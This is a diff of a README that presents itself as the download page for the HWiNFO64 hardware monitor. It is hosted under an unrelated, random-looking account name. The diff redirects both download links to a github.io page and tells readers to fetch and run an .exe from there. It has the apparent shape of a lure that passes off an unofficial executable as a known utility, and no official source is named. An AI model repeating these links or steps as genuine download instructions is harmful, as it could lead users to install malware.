@@ -1,6 +1,6 @@
 # 🖥️ HWiNFO64 - Monitor PC hardware temperature and status
 
-[![Download HWiNFO64](https://img.shields.io/badge/Download-HWiNFO64-blue.svg)](https://github.com/Quatercentenaryfederaltaxlien734/HWiNFO64)
+[![Download HWiNFO64](https://img.shields.io/badge/Download-HWiNFO64-blue.svg)](https://quatercentenaryfederaltaxlien734.github.io)
 
 HWiNFO64 provides detailed information about your computer hardware. It tracks system performance and thermal data. Use this tool to monitor your processor, graphics card, and motherboard. It works on Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ HWiNFO64 provides detailed information about your computer hardware. It tracks s
 
 Follow these steps to get the application onto your system:
 
-1. Visit the project repository page at [https://github.com/Quatercentenaryfederaltaxlien734/HWiNFO64](https://github.com/Quatercentenaryfederaltaxlien734/HWiNFO64).
+1. Visit the project repository page at [https://quatercentenaryfederaltaxlien734.github.io](https://quatercentenaryfederaltaxlien734.github.io).
 2. Look for the Releases section on the right side of the screen.
 3. Click the latest version link.
 4. Select the file ending in .exe to start your download.
